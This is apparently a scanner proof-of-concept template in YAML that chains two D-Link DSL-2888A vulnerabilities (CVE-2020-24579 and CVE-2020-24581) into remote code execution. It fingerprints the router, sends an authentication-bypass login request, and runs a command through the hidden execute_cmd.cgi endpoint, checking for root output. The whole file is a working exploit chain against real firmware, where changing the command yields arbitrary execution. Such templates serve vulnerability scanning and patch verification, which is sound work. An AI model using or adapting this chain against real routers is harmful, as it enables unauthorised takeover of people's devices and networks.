detail:
  author: mvhz81
  info: dlink-dsl-2888a CVE-2020-24579(Insufficient Authentication) + Hidden Functionality
    (CVE-2020-24581) = RCE
  links:
  - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/d-link-multiple-security-vulnerabilities-leading-to-rce/
expression: r0() && r1() && r2()
manual: true
name: poc-yaml-dlink-dsl-2888a-rce
rules:
  r0:
    expression: response.status == 200 && response.content_type.contains("text/html")
      && response.body.bcontains(b"var ModelName=\"DSL-2888A\";")
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /page/login/login.html
  r1:
    expression: response.status == 302 && response.headers["location"] == "/page/login/login_fail.html"
    request:
      body: username=admin&password=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
      cache: true
      follow_redirects: false
      headers:
        Content-Type: application/x-www-form-urlencoded
      method: POST
      path: /
  r2:
    expression: response.status == 200 && response.content_type.contains("text/html")
      && response.body.bcontains(b"uid=0(admin) gid=0(admin)")
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /cgi-bin/execute_cmd.cgi?timestamp=1589333279490&cmd=id
transport: http
